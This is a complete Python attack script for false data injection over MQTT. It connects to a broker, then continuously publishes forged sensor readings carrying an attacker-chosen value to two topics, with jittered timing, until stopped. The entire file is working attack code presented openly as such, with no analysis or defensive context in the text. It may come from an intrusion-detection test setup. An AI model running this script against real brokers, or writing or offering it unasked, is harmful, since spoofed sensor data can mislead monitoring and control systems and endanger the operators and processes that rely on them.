#!/usr/bin/env python3
"""
MQTT False Data Injection
Injects malicious sensor data into MQTT topics
"""

import json
import os
import random
import socket
import sys
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

if len(sys.argv) != 8:
    print(f"Usage: {sys.argv[0]} <BROKER_IP> <BROKER_PORT> <TOPIC1> <TOPIC2> <MALICIOUS_VALUE> <BASE_DELAY> <JITTER>")
    sys.exit(1)

BROKER_IP = sys.argv[1]
BROKER_PORT = int(sys.argv[2])
TOPIC1 = sys.argv[3]
TOPIC2 = sys.argv[4]
MALICIOUS_VALUE = float(sys.argv[5])
BASE_DELAY_S = float(sys.argv[6])
JITTER_S = float(sys.argv[7])

TOPICS_TO_ATTACK = [TOPIC1, TOPIC2]
QOS = 1
RETAIN = False
CONNECT_TIMEOUT_S = 10

def utc_ts() -> float:
    return time.time()

def utc_iso(ts: float) -> str:
    return datetime.fromtimestamp(ts, tz=timezone.utc).isoformat()

def generate_malicious_payload(topic: str) -> str:
    try:
        sensor_id = int(topic.split('/')[-1])
    except:
        sensor_id = 999 

    payload = {
        "id": sensor_id,
        "v": MALICIOUS_VALUE,
        "t": 25.0,
        "ts": time.time()
    }
    return json.dumps(payload)

class State:
    connected = False
    connect_rc = None
    published_ok = 0
    published_fail = 0

def on_connect(client, userdata, flags, rc):
    userdata["state"].connect_rc = rc
    userdata["state"].connected = (rc == 0)
    if rc == 0:
        print(f"[mqtt_injection] Connected to broker {BROKER_IP}:{BROKER_PORT}")
    else:
        print(f"[mqtt_injection] Connection failed with rc={rc}")

def run_attack():
    attack_id = f"MQTT_INJ_{int(time.time())}_{random.randint(1000,9999)}"
    start_ts = utc_ts()

    print("=" * 60)
    print(f"MQTT False Data Injection")
    print(f"Attack ID: {attack_id}")
    print(f"Broker: {BROKER_IP}:{BROKER_PORT}")
    print(f"Topics: {TOPICS_TO_ATTACK}")
    print(f"Malicious value: {MALICIOUS_VALUE}")
    print(f"Base delay: {BASE_DELAY_S}s, Jitter: {JITTER_S}s")
    print(f"Mode: CONTINUOUS (Press Ctrl+C to stop)")
    print("=" * 60)

    st = State()
    client = mqtt.Client(userdata={"state": st})
    client.on_connect = on_connect

    try:
        client.connect(BROKER_IP, BROKER_PORT, keepalive=60)
        client.loop_start()

        t0 = time.time()
        while not st.connected and (time.time() - t0) < CONNECT_TIMEOUT_S:
            if st.connect_rc is not None and st.connect_rc != 0:
                raise RuntimeError(f"Broker rejected connection (rc={st.connect_rc})")
            time.sleep(0.05)

        if not st.connected:
            raise RuntimeError(f"Could not connect to MQTT broker in {CONNECT_TIMEOUT_S}s")

        print(f"[mqtt_injection] Starting continuous injection...")
        
        topic_index = 0
        num_topics = len(TOPICS_TO_ATTACK)
        msg_count = 0

        while True:
            current_topic = TOPICS_TO_ATTACK[topic_index]
            current_payload = generate_malicious_payload(current_topic)
            
            res = client.publish(current_topic, current_payload, qos=QOS, retain=RETAIN)
            if res.rc == mqtt.MQTT_ERR_SUCCESS:
                st.published_ok += 1
                msg_count += 1
                if msg_count % 100 == 0:
                    print(f"[mqtt_injection] Injected {msg_count} messages...")
            else:
                st.published_fail += 1
                print(f"[mqtt_injection] Publish failed on {current_topic} (rc={res.rc})")

            topic_index = (topic_index + 1) % num_topics

            delay = BASE_DELAY_S
            if JITTER_S > 0:
                delay = max(0.0, BASE_DELAY_S + random.uniform(-JITTER_S, JITTER_S))
            time.sleep(delay)

    except KeyboardInterrupt:
        end_ts = utc_ts()
        duration = round(end_ts - start_ts, 3)
        print(f"\n[mqtt_injection] Stopped by user (Ctrl+C)")
        print(f"[mqtt_injection] Duration: {duration}s")
        print(f"[mqtt_injection] Total messages injected: {st.published_ok}")
        print(f"[mqtt_injection] Failed: {st.published_fail}")

    except Exception as e:
        print(f"\n[mqtt_injection] ERROR: {e}")
        sys.exit(1)
    finally:
        try:
            client.loop_stop()
        except:
            pass
        try:
            client.disconnect()
        except:
            pass


if __name__ == "__main__":
    run_attack()
